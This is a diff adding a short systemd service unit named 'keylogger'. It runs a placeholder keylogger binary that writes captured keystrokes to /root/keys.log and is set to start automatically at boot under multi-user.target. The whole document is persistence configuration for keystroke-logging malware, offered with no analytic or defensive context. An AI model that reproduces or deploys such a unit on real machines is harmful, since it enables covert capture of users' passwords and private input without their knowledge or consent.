@@ -1,0 +1,8 @@
+[Unit]
+Description=keylogger
+
+[Service]
+ExecStart=/path/to/keylogger/binary -f /root/keys.log
+
+[Install]
+WantedBy=multi-user.target
